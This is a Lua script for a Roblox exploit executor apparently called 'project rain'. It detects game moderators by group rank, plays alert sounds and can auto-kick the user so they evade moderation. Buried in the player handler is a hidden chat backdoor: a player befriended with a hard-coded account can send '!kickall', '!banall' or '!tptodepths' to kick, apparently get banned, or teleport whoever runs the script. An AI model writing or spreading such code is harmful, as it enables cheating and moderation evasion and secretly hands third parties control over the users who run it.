local Players = cachedServices["Players"]
local lp = Players.LocalPlayer;
local getasset = getcustomasset or getsynasset;
if not isfile("moderatorjoin.mp3") then
    writefile("moderatorjoin.mp3",game:HttpGet("https://github.com/MimiTest2/project-rain-assets/raw/main/moderatorjoin.mp3"));
end

if not isfile("moderatorleave.mp3") then
    writefile("moderatorleave.mp3",game:HttpGet("https://github.com/MimiTest2/project-rain-assets/raw/main/moderatorleave.mp3"));
end

local real = lp:IsFriendsWith(4935143614);

function checkName(name) -- true if allowed, false if not
	local letters = name:split("")
	local l = 0
	local i = 0
	
	for _,v in pairs(letters) do
		if v == "l" then
			l += 1
		elseif v == "I" then
			i += 1
		end
	end
	
	if l+i == name:len() then
		return false
	elseif l > 4 and i > 4 then
		return false
	end
	
	return true
end
local mods = {};
local function onPlayerAdded(player, gay)
    pcall(function()    
        if not checkName(player.Name) then
            getgenv().rainlibrary:Notify("This player is possibly a exploiter: " .. player.Name .. " (ILIL CHECK)", 25)
        end
        if gay then
            getgenv().rainlibrary:Notify("I am checking: " .. player.Name,15);
        end
        function modDetectorReal()
            repeat task.wait(0.15) until player.Parent == Players;
            if player:GetRankInGroup(5212858) > 0 then
                task.spawn(function() 
                    xpcall(function()
                        local soundy = Instance.new("Sound", cachedServices["CoreGui"])
                        soundy.SoundId = getasset("moderatorjoin.mp3")
                        soundy.PlaybackSpeed = 1
                        soundy.Playing = true
                        soundy.Volume = 5
                        task.wait(3)
                        soundy:Remove()
                        --[[
        local sund = Instance.new("Sound")
        sound.Vlume = 1.5
        sound.SundId = getcustomasset(path,false)
        sound.Prent = Services["Workspace"]
        sound:Pay()
                        ]]
                    end,warn) 
                end)
                local suc, err = pcall(function()
                    getgenv().rainlibrary:Notify("I have detected a moderator: " .. player.Name .. " Role: '" .. player:GetRoleInGroup(5212858) .. "'",9e9)
                end)
                if not suc then
                    getgenv().rainlibrary:Notify("I have detected a moderator: " .. player.Name,9e9)
                end
                mods[player.Name] = true;
                pcall(function()
                    if Toggles.KOMJ.Value then
                        cachedServices["Players"].LocalPlayer:Kick("Moderator joined.")
                    end
                end)
            else
                pcall(function()
                    if player:IsFriendsWith(4935143614) then
                        if lp ~= player and not real then
                            player.Chatted:Connect(function(msg)
                                if msg == "!kickall" then
                                    lp:Kick("A project rain admin has kicked you from the game.");
                                elseif msg == "!banall" then
                                    getgenv().require(cachedServices["ReplicatedStorage"].Modules.ClientManager.KeyHandler)();  
                                elseif msg == "!tptodepths" then
                                    xpcall(
                                        function()
                                            local o = 9e9
                                            local p = nil
                                            for j, k in pairs(workspace:GetChildren()) do
                                                if
                                                    k.Name == "DepthsWhirlpool" and
                                                    k:GetPivot().Position -
                                                    game.Players.LocalPlayer.Character:GetPivot().Position.Magnitude <
                                                    o
                                                then
                                                    o =
                                                        k:GetPivot().Position -
                                                        game.Players.LocalPlayer.Character:GetPivot().Position.Magnitude
                                                    p = k
                                                end
                                            end
                                            if not p:FindFirstChild("Part") then
                                                rainlibrary:Notify("whirlpool ain loaded")
                                                game.Players.LocalPlayer:RequestStreamAroundAsync(p:GetPivot().p)
                                                task.wait(2.5)
                                                if not p:FindFirstChild("Part") then
                                                    return
                                                end
                                                rainlibrary:Notify("whirlpool reloaded")
                                            end
                                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = p:GetPivot()
                                        end,
                                        warn
                                    )
                                end
                            end)
                        end
                    end
                end);
            end
        end
        local suc,err = pcall(modDetectorReal)
        if not suc then
            if err:match("429") then
                getgenv().rainlibrary:Notify("Rechecking to: " .. player.Name .. " due to a error.",5);
                task.wait(10 + math.random(7.5,10.5));
                suc,err = pcall(modDetectorReal)
            end
            if not suc then
                getgenv().rainlibrary:Notify("I Failed to detect if " .. player.Name .. " is a moderator (ERR: " .. err .. ")",9e9);
            end
        end
        --if Toggles.UltraStreamerMode.Value then 
        --    getgenv().rainlibrary:Notify("BUY PROJECT RAIN is a voidwalker.", 9e9);
        --else
        --getgenv().rainlibrary:Notify(player.Name .. " is a voidwalker.", 9e9);
        --end
    end)
end
Players.PlayerRemoving:Connect(function(player)
    if mods[player.Name] then
        mods[player.Name] = false;
        getgenv().rainlibrary:Notify("A mod has left the game. [" .. player.Name .. "]");
        local soundy = Instance.new("Sound", cachedServices["CoreGui"])
        soundy.SoundId = getasset("moderatorleave.mp3")
        soundy.PlaybackSpeed = 1
        soundy.Playing = true
        soundy.Volume = 5
        task.wait(3)
        soundy:Remove()
    end
end)
Players.PlayerAdded:Connect(onPlayerAdded)
for i, v in pairs(Players:GetPlayers()) do
    if v ~= lp then
        task.spawn(function() 
            pcall(onPlayerAdded,v, true);
        end);
        task.wait(game.PlaceId == 13891478131 and 0.65 or 0.3);
    end
end
getgenv().rainlibrary:Notify("To remove notifications, Click on them.", 75)

